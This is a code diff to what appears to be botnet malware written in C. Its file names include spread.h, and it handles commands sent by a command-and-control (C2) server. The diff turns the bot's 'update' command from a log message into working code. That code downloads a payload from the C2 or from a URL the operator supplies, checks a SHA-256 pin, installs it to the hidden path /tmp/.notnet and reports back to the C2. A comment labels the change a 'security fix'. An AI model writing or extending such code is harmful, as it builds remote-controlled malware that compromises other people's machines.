@@ -4,6 +4,7 @@
  */
 #include "protocol.h"
 #include "spread.h"
+#include "payload.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -1753,7 +1754,32 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 }
             }
         } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
-            log_info("CMD: update");
+            /* SECURITY FIX (#65): Actually perform the update instead of
+             * logging. Parses an optional URL argument:
+             *   update                 -> fetch from configured C2 path
+             *   update <url>           -> fetch from explicit http:// URL
+             * Downloads, verifies the SHA-256 pin (fail-closed), and
+             * installs to /tmp/.notnet. */
+            char *args = cmd + strlen(CMD_UPDATE);
+            while (*args == ' ' || *args == '\t') args++;
+
+            char url[1024] = {0};
+            if (*args) {
+                snprintf(url, sizeof(url), "%.1000s", args);
+            }
+
+            int result = payload_update(bot, url[0] ? url : NULL, "/tmp/.notnet");
+            if (result > 0) {
+                log_info("CMD: update: downloaded %d bytes", result);
+                if (payload_install(bot, "/tmp/.notnet") == 0) {
+                    protocol_send_response(bot, CMD_UPDATE, "update: installed");
+                } else {
+                    protocol_send_response(bot, CMD_UPDATE, "update: downloaded but install failed");
+                }
+            } else {
+                log_warn("CMD: update failed");
+                protocol_send_response(bot, CMD_UPDATE, "update: failed (SHA-256 pin mismatch or download error)");
+            }
         } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
             log_warn("CMD: reboot requested by C2");
             protocol_send_response(bot, CMD_REBOOT, "reboot: received");
